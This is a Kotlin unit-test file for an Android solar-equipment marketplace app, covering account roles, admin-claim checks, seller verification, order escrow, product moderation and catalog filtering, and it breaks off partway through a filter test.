package com.example

import com.example.data.model.*
import com.example.data.repository.SolarRepository
import com.example.ui.viewmodel.MarketplacePortalMode
import com.example.ui.viewmodel.MarketplaceViewModel
import com.example.util.FirebaseAuthAdminHandler
import org.junit.Assert.assertEquals
import org.junit.Assert.assertNotNull
import org.junit.Assert.assertNull
import org.junit.Assert.assertTrue
import org.junit.Test

class ExampleUnitTest {
    private val repository = SolarRepository()

    @Test
    fun addition_isCorrect() {
        assertEquals(4, 2 + 2)
    }

    @Test
    fun testCurrencyFormatting() {
        val ngn = AvailableCurrencies.first { it.code == "NGN" }
        assertEquals("₦100,000", ngn.formatPrice(100000L))

        val usd = AvailableCurrencies.first { it.code == "USD" }
        assertTrue(usd.formatPrice(152000L).contains("$100.00"))
    }

    @Test
    fun testRepositoryHasErrorCodesAndProducts() {
        assertTrue(repository.errorCodes.isNotEmpty())
        assertTrue(repository.products.isNotEmpty())
        assertTrue(repository.symptoms.isNotEmpty())
        assertTrue(repository.certifiedTechnicians.isNotEmpty())
    }

    @Test
    fun testCameraPermissionConstant() {
        assertEquals(android.Manifest.permission.CAMERA, com.example.util.CameraPermissionHelper.CAMERA_PERMISSION)
    }

    @Test
    fun testTechnicianViewModelHasApplicationConstructor() {
        val constructor = com.example.ui.viewmodel.TechnicianViewModel::class.java.getConstructor(android.app.Application::class.java)
        org.junit.Assert.assertNotNull(constructor)
    }

    @Test
    fun testAuthViewModelHasApplicationConstructor() {
        val constructor = com.example.ui.viewmodel.AuthViewModel::class.java.getConstructor(android.app.Application::class.java)
        org.junit.Assert.assertNotNull(constructor)
    }

    @Test
    fun testUserAccountCreation() {
        val user = com.example.data.model.UserAccount(
            uid = "user_123",
            name = "Adebayo Adeleke",
            email = "adebayo@solarfix.africa",
            safetyTermsAccepted = true
        )
        assertEquals("user_123", user.uid)
        assertEquals("Adebayo Adeleke", user.name)
        assertEquals("adebayo@solarfix.africa", user.email)
        assertEquals(false, user.isAdmin)
        assertTrue(user.safetyTermsAccepted)
    }

    @Test
    fun testAdminUserRoleCreation() {
        val admin = com.example.data.model.UserAccount(
            uid = "admin_001",
            name = "Solarfix Admin",
            email = "admin@solarfix.africa",
            role = com.example.data.model.UserRole.ADMIN
        )
        assertEquals(com.example.data.model.UserRole.ADMIN, admin.role)
        assertEquals(true, admin.isAdmin)
        assertEquals("Platform Administrator", admin.role.displayName)
    }

    @Test
    fun testUserAccountCustomIsAdminOverride() {
        val customClaimUser = com.example.data.model.UserAccount(
            uid = "uid_claim_999",
            name = "Security Auditor",
            email = "auditor@solarfix.africa",
            role = com.example.data.model.UserRole.CUSTOMER,
            isAdmin = true
        )
        assertTrue("Custom Firebase claim can grant isAdmin access", customClaimUser.isAdmin)
    }

    @Test
    fun testAppOwnerAccountCreation() {
        val owner = com.example.data.model.UserAccount(
            uid = "owner_001",
            name = "Nekes Kingsley",
            email = "nekeskingsley@gmail.com",
            role = com.example.data.model.UserRole.ADMIN
        )
        assertEquals("nekeskingsley@gmail.com", owner.email)
        assertEquals(com.example.data.model.UserRole.ADMIN, owner.role)
        assertEquals(true, owner.isAdmin)
        assertEquals("Nekes Kingsley", owner.name)
    }

    @Test
    fun testNavigationRoutes() {
        assertEquals("login", com.example.ui.SolarfixRoutes.LOGIN)
        assertEquals("signup", com.example.ui.SolarfixRoutes.SIGNUP)
        assertEquals("verify_email", com.example.ui.SolarfixRoutes.VERIFY_EMAIL)
        assertEquals("dashboard", com.example.ui.SolarfixRoutes.DASHBOARD)
    }

    @Test
    fun testPendingEmailVerificationModel() {
        val pending = com.example.data.repository.PendingEmailVerification(
            name = "Chukwudi Okafor",
            email = "chukwudi@solarfix.africa",
            password = "securePassword123",
            verificationCode = "591842",
            expiryEpoch = System.currentTimeMillis() + 900000L
        )
        assertEquals("Chukwudi Okafor", pending.name)
        assertEquals("chukwudi@solarfix.africa", pending.email)
        assertEquals("591842", pending.verificationCode)
        assertEquals(6, pending.verificationCode.length)
        assertTrue(pending.expiryEpoch > System.currentTimeMillis())
    }

    @Test
    fun testFirestoreUserModelWithIsAdmin() {
        val firestoreUser = com.example.data.model.FirestoreUser(
            uid = "user_firestore_123",
            name = "Nekes Kingsley",
            email = "nekeskingsley@gmail.com",
            role = "ADMIN",
            isAdmin = true,
            createdAtEpoch = 1730588400000L,
            safetyTermsAccepted = true
        )
        val map = firestoreUser.toMap()
        assertEquals(true, map["isAdmin"])
        assertEquals("ADMIN", map["role"])
        assertEquals("nekeskingsley@gmail.com", map["email"])

        // Test round trip deserialization from Firestore Map
        val parsed = com.example.data.model.FirestoreUser.fromMap("user_firestore_123", map)
        assertEquals(true, parsed.isAdmin)
        assertEquals("ADMIN", parsed.role)

        val domainAccount = parsed.toUserAccount()
        assertEquals(true, domainAccount.isAdmin)
        assertEquals(com.example.data.model.UserRole.ADMIN, domainAccount.role)
    }

    @Test
    fun testAdminClaimHandlerEvaluation() {
        // Test custom claims: admin=true
        val adminBoolClaims = mapOf<String, Any?>("admin" to true)
        assertTrue(com.example.util.FirebaseAuthAdminHandler.evaluateCustomClaims(adminBoolClaims))

        // Test custom claims: isAdmin=true
        val isAdminBoolClaims = mapOf<String, Any?>("isAdmin" to true)
        assertTrue(com.example.util.FirebaseAuthAdminHandler.evaluateCustomClaims(isAdminBoolClaims))

        // Test custom claims: role="admin"
        val roleAdminClaims = mapOf<String, Any?>("role" to "admin")
        assertTrue(com.example.util.FirebaseAuthAdminHandler.evaluateCustomClaims(roleAdminClaims))

        // Test unauthorized standard customer claims
        val standardUserClaims = mapOf<String, Any?>("role" to "customer", "admin" to false)
        org.junit.Assert.assertFalse(com.example.util.FirebaseAuthAdminHandler.evaluateCustomClaims(standardUserClaims))

        // Test null claims
        org.junit.Assert.assertFalse(com.example.util.FirebaseAuthAdminHandler.evaluateCustomClaims(null))

        // Test Owner and Admin email whitelist
        assertTrue(com.example.util.FirebaseAuthAdminHandler.isOwnerOrSystemAdminEmail("nekeskingsley@gmail.com"))
        assertTrue(com.example.util.FirebaseAuthAdminHandler.isOwnerOrSystemAdminEmail("admin@solarfix.africa"))
        org.junit.Assert.assertFalse(com.example.util.FirebaseAuthAdminHandler.isOwnerOrSystemAdminEmail("regular.customer@gmail.com"))
    }

    @Test
    fun testMarketplaceCertifiedSellerProduct() {
        val product = com.example.data.model.MarketplaceProduct(
            id = "test_panel_1",
            title = "Canadian Solar 550W Mono PERC",
            category = com.example.data.model.ProductCategory.PANELS,
            brand = "Canadian Solar",
            powerRating = "550W",
            voltage = "41.5V",
            basePriceNgn = 145000L,
            rating = 4.9f,
            reviewsCount = 18,
            specs = mapOf("Power" to "550W", "Cell Type" to "Half-cell"),
            description = "High efficiency mono perc solar panel",
            sellerName = "Kano Solar Hub",
            sellerLocation = "Kano, Nigeria",
            isCertifiedSeller = true,
            sellerCertificationBadge = "NEMSA Certified Installer",
            condition = "Brand New (OEM Sealed)"
        )
        assertTrue(product.isCertifiedSeller)
        assertEquals("NEMSA Certified Installer", product.sellerCertificationBadge)
        assertEquals("Kano, Nigeria", product.sellerLocation)
        assertEquals("Brand New (OEM Sealed)", product.condition)
    }

    @Test
    fun testMarketplaceViewModelAddListing() {
        val vm = com.example.ui.viewmodel.MarketplaceViewModel()
        val initialCount = vm.products.value.size
        vm.addNewListing(
            title = "Felicity 5kWh Lithium Battery",
            category = com.example.data.model.ProductCategory.BATTERIES,
            brand = "Felicity Solar",
            priceNgn = 1250000L,
            location = "Ikeja Computer Village, Lagos",
            sellerName = "Engr. Musa Solar Supplies",
            isCertifiedSeller = true,
            condition = "Brand New (Box Pack)",
            specs = mapOf("Capacity" to "5kWh", "Voltage" to "48V"),
            description = "Grade A LiFePO4 cells with smart BMS",
            photoBitmap = null,
            certificationBadge = "Tier 1 OEM Distributor"
        )
        assertEquals(initialCount + 1, vm.products.value.size)
        val added = vm.products.value.first()
        assertEquals("Felicity 5kWh Lithium Battery", added.title)
        assertTrue(added.isCertifiedSeller)
        assertEquals("Tier 1 OEM Distributor", added.sellerCertificationBadge)
    }

    @Test
    fun testMultiVendorNekesStoreAndInternalNavigation() {
        val vm = com.example.ui.viewmodel.MarketplaceViewModel()
        val nekesStore = vm.stores.value.find { it.id == "store_nekes" }
        org.junit.Assert.assertNotNull(nekesStore)
        assertEquals("NEKES Solar Energy Store", nekesStore?.storeName)

        // Visiting individual seller store opens internal screen inside SolarFix
        vm.openSellerStoreInsideApp("store_nekes")
        assertEquals("store_nekes", vm.selectedStoreId.value)
        assertEquals(
            com.example.ui.viewmodel.CustomerSubScreen.STOREFRONT,
            vm.customerSubScreen.value
        )

        vm.closeSellerStore()
        assertEquals(
            com.example.ui.viewmodel.CustomerSubScreen.CATALOG,
            vm.customerSubScreen.value
        )
    }

    @Test
    fun testMultiVendorOrderCommissionAndEscrowRelease() {
        val vm = com.example.ui.viewmodel.MarketplaceViewModel()
        vm.clearCart()
        val product = vm.products.value.first { it.storeId == "store_nekes" && it.inStock && it.isActive }
        vm.addToCart(product, com.example.data.model.PaymentPlanType.OUTRIGHT)

        val defaultAddr = vm.addresses.value.first()
        vm.confirmAndPlaceOrder(
            customerName = "Test Buyer",
            customerEmail = "buyer@solarfix.africa",
            address = defaultAddr,
            paymentPlan = com.example.data.model.PaymentPlanType.OUTRIGHT,
            paymentMethod = com.example.data.model.PaymentMethodType.CARD
        )

        val placedOrder = vm.lastPlacedOrder.value
        org.junit.Assert.assertNotNull(placedOrder)
        assertEquals("NEKES Solar Energy Store", placedOrder?.primaryStoreName)
        assertTrue((placedOrder?.solarfixCommissionNgn ?: 0L) > 0L)
        assertEquals(
            placedOrder!!.subtotalNgn - placedOrder.solarfixCommissionNgn,
            placedOrder.netSellerEarningsNgn
        )

        // Advance order to DELIVERED and verify escrow release
        vm.advanceSellerOrderStatus(placedOrder.id, com.example.data.model.OrderStatus.DELIVERED)
        val updatedOrder = vm.orders.value.find { it.id == placedOrder.id }
        assertEquals(com.example.data.model.OrderStatus.DELIVERED, updatedOrder?.status)
        assertEquals(true, updatedOrder?.escrowReleased)
    }

    @Test
    fun testSellerRegistrationAndVerificationLifecycle() {
        val vm = com.example.ui.viewmodel.MarketplaceViewModel()

        // 1. Submit a new Seller Registration Application
        val createdStore = vm.submitSellerRegistration(
            fullNameOrBusinessName = "SunPeak Solar Technologies Ltd",
            ownerFullName = "Engr. Tunde Bakare",
            cacRegistrationNumber = "RC-3094812",
            businessPhone = "+234 803 555 0199",
            businessEmail = "sales@sunpeaksolar.ng",
            physicalAddress = "Suite 14, Arena Solar Plaza, Oshodi",
            state = "Lagos State",
            city = "Ikeja",
            businessDescription = "Distributor of hybrid inverters and Grade-A LiFePO4 batteries.",
            logoBitmap = null,
            idDocumentType = "NIN Slip / National ID Card",
            idDocumentNumber = "NIN-74829103841",
            idDocumentBitmap = null,
            premisesPhotoBitmap = null,
            bankAccountName = "SUNPEAK SOLAR TECHNOLOGIES LTD",
            bankName = "Zenith Bank PLC",
            bankAccountNumber = "1029384756"
        )

        // Every new seller must initially have Pending Verification status
        assertEquals(com.example.data.model.StoreVerificationStatus.PENDING, createdStore.status)
        assertEquals("Pending Verification", createdStore.status.label)
        assertEquals("RC-3094812", createdStore.businessRegNumber)
        assertEquals("1029384756", createdStore.bankAccountNumber)

        // 2. Unapproved seller (Pending Verification) is strictly blocked from publishing products
        val countBeforeBlockedPublish = vm.products.value.size
        val publishWhilePending = vm.addNewListing(
            title = "SunPeak 10kW Hybrid Inverter",
            category = com.example.data.model.ProductCategory.INVERTERS,
            brand = "SunPeak",
            priceNgn = 1650000L,
            location = "Ikeja, Lagos",
            sellerName = createdStore.storeName,
            isCertifiedSeller = false,
            condition = "Brand New",
            specs = mapOf("Rating" to "10kW"),
            description = "Pure sine wave inverter",
            photoBitmap = null,
            storeId = createdStore.id
        )
        org.junit.Assert.assertFalse("Pending seller must not be allowed to publish products", publishWhilePending)
        assertEquals(countBeforeBlockedPublish, vm.products.value.size)

        // 3. Admin requests additional information
        vm.setSellerVerificationStatus(
            storeId = createdStore.id,
            status = com.example.data.model.StoreVerificationStatus.MORE_INFO_REQUIRED,
            adminNote = "Please upload clearer utility bill for Oshodi warehouse."
        )
        val moreInfoStore = vm.stores.value.find { it.id == createdStore.id }!!
        assertEquals(com.example.data.model.StoreVerificationStatus.MORE_INFO_REQUIRED, moreInfoStore.status)
        assertTrue(moreInfoStore.adminVerificationNote.contains("utility bill"))

        // 4. Seller resubmits requested verification info -> returns to PENDING
        vm.resubmitSellerVerificationInfo(
            storeId = createdStore.id,
            cacRegistrationNumber = "RC-3094812",
            physicalAddress = "Suite 14, Arena Solar Plaza, Oshodi",
            idDocumentType = "NIN Slip / National ID Card",
            idDocumentNumber = "NIN-74829103841",
            bankAccountName = "SUNPEAK SOLAR TECHNOLOGIES LTD",
            bankName = "Zenith Bank PLC",
            bankAccountNumber = "1029384756",
            sellerResponseNote = "Attached verified Ikeja Electric utility bill."
        )
        assertEquals(
            com.example.data.model.StoreVerificationStatus.PENDING,
            vm.stores.value.find { it.id == createdStore.id }?.status
        )

        // 5. Admin approves the seller application -> grants VERIFIED SELLER badge and unlocks publishing
        vm.setSellerVerificationStatus(
            storeId = createdStore.id,
            status = com.example.data.model.StoreVerificationStatus.APPROVED,
            adminNote = "All KYC, CAC, and premises documents verified."
        )
        val approvedStore = vm.stores.value.find { it.id == createdStore.id }!!
        assertEquals(com.example.data.model.StoreVerificationStatus.APPROVED, approvedStore.status)
        assertEquals("VERIFIED SELLER", approvedStore.accreditationBadge)

        val publishAfterApproval = vm.addNewListing(
            title = "SunPeak 10kW Hybrid Inverter",
            category = com.example.data.model.ProductCategory.INVERTERS,
            brand = "SunPeak",
            priceNgn = 1650000L,
            location = "Ikeja, Lagos",
            sellerName = approvedStore.storeName,
            isCertifiedSeller = true,
            condition = "Brand New",
            specs = mapOf("Rating" to "10kW"),
            description = "Pure sine wave inverter",
            photoBitmap = null,
            storeId = approvedStore.id
        )
        assertTrue("Approved seller must be allowed to publish products", publishAfterApproval)
        val publishedProduct = vm.products.value.first { it.storeId == approvedStore.id }
        assertTrue(publishedProduct.isCertifiedSeller)
        assertEquals("VERIFIED SELLER", publishedProduct.sellerCertificationBadge)

        // 6. Admin suspends previously approved seller -> hides products from customer catalog & blocks new listings
        vm.setSellerVerificationStatus(
            storeId = approvedStore.id,
            status = com.example.data.model.StoreVerificationStatus.SUSPENDED
        )
        val customerVisibleProducts = vm.getFilteredProducts(storeFilterId = approvedStore.id)
        assertTrue("Suspended seller products must be hidden from customer catalog", customerVisibleProducts.isEmpty())
    }

    @Test
    fun testSellerPublicProfileStripsSensitiveData() {
        val vm = com.example.ui.viewmodel.MarketplaceViewModel()
        val nekesStore = vm.stores.value.first { it.id == "store_nekes" }
        val publicProfile = nekesStore.toPublicProfile()

        assertEquals("NEKES Solar Energy Store", publicProfile.storeName)
        assertTrue(publicProfile.isVerifiedSeller)

        // Verify PublicStoreProfile class does NOT declare any sensitive KYC or bank fields
        val publicFieldNames = com.example.data.model.PublicStoreProfile::class.java.declaredFields.map { it.name }
        org.junit.Assert.assertFalse(publicFieldNames.contains("bankAccountNumber"))
        org.junit.Assert.assertFalse(publicFieldNames.contains("bankAccountName"))
        org.junit.Assert.assertFalse(publicFieldNames.contains("bankName"))
        org.junit.Assert.assertFalse(publicFieldNames.contains("idDocumentNumber"))
        org.junit.Assert.assertFalse(publicFieldNames.contains("idDocumentBitmap"))
        org.junit.Assert.assertFalse(publicFieldNames.contains("premisesPhotoBitmap"))
        org.junit.Assert.assertFalse(publicFieldNames.contains("physicalAddress"))
    }

    @Test
    fun testIndividualSellerStoreAttributesAndInAppRoute() {
        val vm = com.example.ui.viewmodel.MarketplaceViewModel()
        val nekesStore = vm.stores.value.first { it.id == "store_nekes" }
        val publicStore = nekesStore.toPublicProfile()

        // Verify all 12 required individual seller store attributes & internal route
        assertEquals("store_nekes", publicStore.id)
        assertEquals("NEKES Solar Energy Store", publicStore.storeName)
        assertEquals("marketplace/sellers/nekes-solar-energy-store", publicStore.inAppStoreRoute)
        assertEquals("Marketplace → Sellers → NEKES Solar Energy Store", publicStore.inAppBreadcrumb)
        assertTrue(publicStore.description.isNotBlank())
        assertTrue(publicStore.cityStateLocation.contains("Lagos"))
        assertTrue(publicStore.publicContactPhone.isNotBlank())
        assertTrue(publicStore.publicContactEmail.isNotBlank())
        assertTrue(publicStore.isVerifiedSeller)
        assertEquals("VERIFIED SELLER", publicStore.verifiedBadgeText)
        assertTrue(publicStore.rating > 0f)
        assertTrue(publicStore.reviewsCount > 0)
        assertTrue(publicStore.successfulSalesCount > 0)
        assertTrue(publicStore.storeOpeningDate.isNotBlank())

        // Verify store products & product categories inside NEKES Solar Energy Store
        val nekesProducts = vm.products.value.filter { it.storeId == "store_nekes" }
        assertTrue(nekesProducts.isNotEmpty())
        val nekesCategories = nekesProducts.map { it.category }.distinct()
        assertTrue(nekesCategories.isNotEmpty())

        // Navigate to Sellers directory inside SolarFix
        vm.openSellersDirectory()
        assertEquals(
            com.example.ui.viewmodel.CustomerSubScreen.SELLERS_DIRECTORY,
            vm.customerSubScreen.value
        )

        // Navigate to NEKES Solar Energy Store via its unique in-app store route or breadcrumb
        vm.openSellerStoreInsideApp("marketplace/sellers/nekes-solar-energy-store")
        assertEquals("store_nekes", vm.selectedStoreId.value)
        assertEquals(
            com.example.ui.viewmodel.CustomerSubScreen.STOREFRONT,
            vm.customerSubScreen.value
        )
        assertEquals("marketplace/sellers/nekes-solar-energy-store", vm.getActiveStoreInAppRoute())
        assertEquals("Marketplace → Sellers → NEKES Solar Energy Store", vm.getActiveStoreInAppBreadcrumb())
    }

    @Test
    fun testSellerDashboardProductManagementOrderRulesAndAnalytics() {
        val vm = com.example.ui.viewmodel.MarketplaceViewModel()

        // 1. Add a new product with video, specs, warranty & delivery options via Seller Dashboard
        val createdProduct = vm.saveOrUpdateSellerProduct(
            existingProductId = null,
            storeId = "store_nekes",
            title = "Deye 12kW 3-Phase Hybrid Inverter",
            category = com.example.data.model.ProductCategory.INVERTERS,
            brand = "Deye",
            powerRating = "12kW",
            voltage = "48V DC / 400V 3-Phase",
            priceNgn = 2450000L,
            stockCount = 8,
            condition = "Brand New (OEM Sealed)",
            specs = mapOf("MPPT" to "Dual 240A", "Phase" to "3-Phase Unbalanced"),
            description = "Industrial 3-phase hybrid solar inverter.",
            warrantyPeriod = "5 Years Manufacturer Warranty",
            deliveryOptions = listOf("Doorstep Delivery (24-48H)", "Warehouse Self-Pickup", "Free Certified Installation"),
            photoBitmaps = emptyList(),
            videoUrlOrUri = "solarfix://video/deye-12kw-load-test",
            videoDescription = "Full 12kW load bank inspection video",
            installmentAllowed = true,
            isActive = true
        )
        org.junit.Assert.assertNotNull(createdProduct)
        assertEquals("Deye 12kW 3-Phase Hybrid Inverter", createdProduct?.title)
        assertEquals("solarfix://video/deye-12kw-load-test", createdProduct?.videoUrlOrUri)
        assertEquals(3, createdProduct?.deliveryOptions?.size)

        // 2. Edit the existing product (price, stock, warranty)
        val updatedProduct = vm.saveOrUpdateSellerProduct(
            existingProductId = createdProduct!!.id,
            storeId = "store_nekes",
            title = "Deye 12kW 3-Phase Hybrid Inverter Pro",
            category = com.example.data.model.ProductCategory.INVERTERS,
            brand = "Deye",
            powerRating = "12kW",
            voltage = "48V DC / 400V 3-Phase",
            priceNgn = 2390000L,
            stockCount = 14,
            condition = "Brand New (OEM Sealed)",
            specs = mapOf("MPPT" to "Dual 240A", "Surge Capacity" to "24kW"),
            description = "Updated industrial 3-phase hybrid solar inverter.",
            warrantyPeriod = "10 Years Manufacturer Warranty",
            deliveryOptions = listOf("Doorstep Delivery (24-48H)", "Same-Day Express (City)"),
            photoBitmaps = emptyList(),
            videoUrlOrUri = "solarfix://video/deye-12kw-load-test-v2",
            videoDescription = "Updated QC video",
            installmentAllowed = true,
            isActive = true
        )
        assertEquals(createdProduct.id, updatedProduct?.id)
        assertEquals("Deye 12kW 3-Phase Hybrid Inverter Pro", updatedProduct?.title)
        assertEquals(2390000L, updatedProduct?.basePriceNgn)
        assertEquals(14, updatedProduct?.stockCount)
        assertEquals("10 Years Manufacturer Warranty", updatedProduct?.warrantyPeriod)

        // 3. Deactivate and reactivate product
        val activeAfterDeactivate = vm.toggleSellerProductActiveStatus(createdProduct.id)
        org.junit.Assert.assertFalse(activeAfterDeactivate)
        assertTrue(vm.getFilteredProducts(storeFilterId = "store_nekes").none { it.id == createdProduct.id })

        val activeAfterReactivate = vm.toggleSellerProductActiveStatus(createdProduct.id)
        assertTrue(activeAfterReactivate)
        assertTrue(vm.getFilteredProducts(storeFilterId = "store_nekes").any { it.id == createdProduct.id })

        // 4. Place an order, accept it, then reject another order according to marketplace rules
        vm.clearCart()
        val freshProduct = vm.products.value.first { it.id == createdProduct.id }
        vm.addToCart(freshProduct)
        vm.confirmAndPlaceOrder(
            customerName = "Engr. Kunle",
            customerEmail = "kunle@solarfix.africa",
            address = vm.addresses.value.first(),
            paymentPlan = com.example.data.model.PaymentPlanType.OUTRIGHT,
            paymentMethod = com.example.data.model.PaymentMethodType.BANK_TRANSFER
        )
        val orderToReject = vm.lastPlacedOrder.value!!
        assertEquals(com.example.data.model.OrderStatus.CONFIRMED, orderToReject.status)

        // Seller accepts order -> status becomes PROCESSING
        assertTrue(vm.acceptSellerOrder(orderToReject.id))
        val acceptedOrder = vm.orders.value.first { it.id == orderToReject.id }
        assertEquals(com.example.data.model.OrderStatus.PROCESSING, acceptedOrder.status)
        assertTrue(acceptedOrder.sellerAccepted)

        // Seller rejects unshipped order -> status becomes REJECTED_BY_SELLER & stock restored to 14
        assertTrue(vm.rejectSellerOrder(orderToReject.id, "Out of Stock / Failed Pre-Dispatch QC Test"))
        val rejectedOrder = vm.orders.value.first { it.id == orderToReject.id }
        assertEquals(com.example.data.model.OrderStatus.REJECTED_BY_SELLER, rejectedOrder.status)
        assertEquals(14, vm.products.value.first { it.id == createdProduct.id }.stockCount)

        // 5. Verify Seller Sales Analytics (Total sales, Total revenue, Orders, Completed, Pending, Balance, Commissions, Monthly performance)
        val analytics = vm.getSellerSalesAnalytics("store_nekes")
        assertEquals("store_nekes", analytics.storeId)
        assertTrue(analytics.totalSalesCount > 0)
        assertTrue(analytics.totalRevenueNgn > 0L)
        assertTrue(analytics.totalOrdersCount > 0)
        assertTrue(analytics.completedOrdersCount >= 1)
        assertTrue(analytics.availableBalanceNgn > 0L)
        assertTrue(analytics.solarfixCommissionsNgn > 0L)
        assertEquals(6, analytics.monthlyPerformance.size)
    }

    @Test
    fun testProductListingCategoriesAuthenticityAndInspectionDistinction() {
        val vm = com.example.ui.viewmodel.MarketplaceViewModel()

        // 1. Verify all 13 required product categories exist in ProductCategory
        val expectedCategoryLabels = listOf(
            "Solar Panels",
            "Inverters",
            "Lithium Batteries",
            "Tubular Batteries",
            "Charge Controllers",
            "Solar Generators",
            "Solar Streetlights",
            "Solar Cables & Wires",
            "Solar Connectors",
            "Circuit Breakers & Protection Devices",
            "Mounting Structures",
            "Complete Solar Kits",
            "Other Solar Accessories"
        )
        val actualCategoryLabels = com.example.data.model.ProductCategory.values()
            .filter { it != com.example.data.model.ProductCategory.ALL }
            .map { it.label }
        assertEquals(13, actualCategoryLabels.size)
        expectedCategoryLabels.forEach { label ->
            assertTrue("Missing product category: $label", actualCategoryLabels.contains(label))
        }

        // Verify initial catalog has products covering all 13 categories
        val catalogCategories = vm.products.value.map { it.category }.toSet()
        assertEquals(13, catalogCategories.size)

        // 2. Verify all 14 required product listing fields on a product
        val sampleProduct = vm.products.value.first { it.id == "prod_deye_5kw" }
        assertTrue(sampleProduct.title.isNotBlank()) // Product name
        assertTrue(sampleProduct.brand.isNotBlank()) // Brand
        assertEquals("SUN-5K-SG03LP1-EU", sampleProduct.effectiveModelNumber) // Model
        assertTrue(sampleProduct.photoAngles.isNotEmpty()) // Product photographs / angles
        assertTrue(sampleProduct.description.isNotBlank()) // Description
        assertTrue(sampleProduct.specs.isNotEmpty()) // Technical specifications
        assertTrue(sampleProduct.formattedPriceNgn.startsWith("₦")) // Price in Nigerian Naira
        assertTrue(sampleProduct.stockCount > 0) // Available quantity
        assertTrue(sampleProduct.warrantyPeriod.isNotBlank()) // Warranty information
        assertTrue(sampleProduct.normalizedCondition in setOf("Brand New", "Used")) // Condition (Brand New or Used)
        assertTrue(sampleProduct.sellerName.isNotBlank() && sampleProduct.sellerLocation.isNotBlank()) // Seller information
        assertEquals("VERIFIED SELLER", sampleProduct.sellerVerificationStatusLabel) // Seller verification status
        assertTrue(sampleProduct.deliveryAvailability.isNotBlank()) // Delivery availability
        assertTrue(sampleProduct.returnPolicy.isNotBlank()) // Return policy

        // 3. Enforce Seller Authenticity Confirmation before publishing
        val unconfirmedBlocked = vm.saveOrUpdateSellerProduct(
            existingProductId = null,
            storeId = "store_nekes",
            title = "Unconfirmed Solar Cable Roll",
            category = com.example.data.model.ProductCategory.SOLAR_CABLES_WIRES,
            brand = "Generic",
            powerRating = "6mm²",
            voltage = "1500V DC",
            priceNgn = 85000L,
            stockCount = 5,
            condition = "Brand New",
            specs = mapOf("Core" to "Tinned Copper"),
            description = "Unconfirmed listing should be blocked.",
            warrantyPeriod = "1 Year Warranty",
            deliveryOptions = listOf("Doorstep Delivery (24-48H)"),
            photoBitmaps = emptyList(),
            videoUrlOrUri = null,
            modelNumber = "CBL-6MM-GEN",
            sellerAuthenticityConfirmed = false
        )
        org.junit.Assert.assertNull("Publishing without confirming authenticity must be blocked", unconfirmedBlocked)

        // 4. Verify strict distinction between Seller Verification (VERIFIED SELLER) and Independent SolarFix Inspection
        val newVerifiedSellerProduct = vm.saveOrUpdateSellerProduct(
            existingProductId = null,
            storeId = "store_nekes",
            title = "Used Tested 3.5kVA Inverter Unit",
            category = com.example.data.model.ProductCategory.INVERTERS,
            brand = "Felicity Solar",
            powerRating = "3.5kVA",
            voltage = "24V DC",
            priceNgn = 320000L,
            stockCount = 2,
            condition = "Used",
            specs = mapOf("Condition Detail" to "Clean Used Unit"),
            description = "Pre-owned 24V inverter in working order.",
            warrantyPeriod = "6 Months Store Warranty",
            deliveryOptions = listOf("Warehouse Self-Pickup"),
            photoBitmaps = emptyList(),
            videoUrlOrUri = null,
            modelNumber = "IVEM3524-USED",
            deliveryAvailability = "Lagos Warehouse Pickup Only",
            returnPolicy = "7-Day Functional Escrow Return Policy",
            sellerAuthenticityConfirmed = true,
            authenticityEvidenceNote = "Serial verified by NEKES Store technician"
        )
        org.junit.Assert.assertNotNull(newVerifiedSellerProduct)
        assertEquals("Used", newVerifiedSellerProduct!!.normalizedCondition)
        // Seller is verified, BUT no independent SolarFix inspection has taken place yet!
        assertTrue(newVerifiedSellerProduct.isCertifiedSeller)
        org.junit.Assert.assertFalse(
            "Never display a SolarFix inspection badge unless an actual inspection has taken place",
            newVerifiedSellerProduct.hasActualSolarFixInspection
        )

        // 5. Admin flags suspicious/high-risk listing, requests additional evidence, seller responds, and Admin records actual inspection
        vm.flagSuspiciousProduct(newVerifiedSellerProduct.id, "High-risk used inverter — verify serial & load bank test.")
        val flagged = vm.products.value.first { it.id == newVerifiedSellerProduct.id }
        assertEquals(com.example.data.model.ProductModerationStatus.SUSPICIOUS_HIGH_RISK, flagged.moderationStatus)
        assertTrue(vm.getFilteredProducts().none { it.id == newVerifiedSellerProduct.id })

        vm.requestProductAuthenticityEvidence(newVerifiedSellerProduct.id, "Upload serial plate and 24V load test report.")
        val evidenceReq = vm.products.value.first { it.id == newVerifiedSellerProduct.id }
        assertEquals(com.example.data.model.ProductModerationStatus.EVIDENCE_REQUESTED, evidenceReq.moderationStatus)

        vm.submitSellerProductAuthenticityEvidence(newVerifiedSellerProduct.id, "Serial #FL-3524-99812 & load test chart attached.")
        val pendingReview = vm.products.value.first { it.id == newVerifiedSellerProduct.id }
        assertEquals(com.example.data.model.ProductModerationStatus.PENDING_REVIEW, pendingReview.moderationStatus)

        // Record actual independent SolarFix inspection -> now hasActualSolarFixInspection becomes true!
        vm.recordSolarFixProductInspection(
            productId = newVerifiedSellerProduct.id,
            passed = true,
            reportId = "SFLAB-2026-8841",
            inspectionNote = "Physical load bank test passed at SolarFix Ikeja Lab."
        )
        val inspectedProduct = vm.products.value.first { it.id == newVerifiedSellerProduct.id }
        assertTrue(inspectedProduct.hasActualSolarFixInspection)
        assertEquals("SFLAB-2026-8841", inspectedProduct.solarfixInspectionReportId)
        assertEquals(com.example.data.model.ProductModerationStatus.APPROVED, inspectedProduct.moderationStatus)

        // 6. Admin removes a counterfeit / misleading product
        vm.removeCounterfeitProduct(newVerifiedSellerProduct.id, "Counterfeit serial sticker detected on secondary unit.")
        val removedProduct = vm.products.value.first { it.id == newVerifiedSellerProduct.id }
        assertEquals(com.example.data.model.ProductModerationStatus.REMOVED_COUNTERFEIT, removedProduct.moderationStatus)
        org.junit.Assert.assertFalse(removedProduct.isActive)
        org.junit.Assert.assertFalse(removedProduct.hasActualSolarFixInspection)
        assertTrue(vm.getFilteredProducts().none { it.id == newVerifiedSellerProduct.id })
    }

    @Test
    fun testCustomerShoppingFiltersRelatedProductsAndMultiSellerCartBreakdown() {
        val vm = com.example.ui.viewmodel.MarketplaceViewModel()
        vm.resetAllFilters()
        vm.clearCart()

        // 1. Test Price Range Filter (Under ₦100k)
        vm.selectPriceRange(com.example.data.model.PriceRangeFilter.UNDER_100K)
        val under100k = vm.getFilteredProducts()
        assertTrue(under100k.isNotEmpty())
        assertTrue(under100k.all { it.basePriceNgn <= 100_000L })

        // 2. Test Brand Filter ("Deye")
        vm.resetAllFilters()
        vm.selectBrand("Deye")
        val deyeProducts = vm.getFilteredProducts()
        assertTrue(deyeProducts.isNotEmpty())
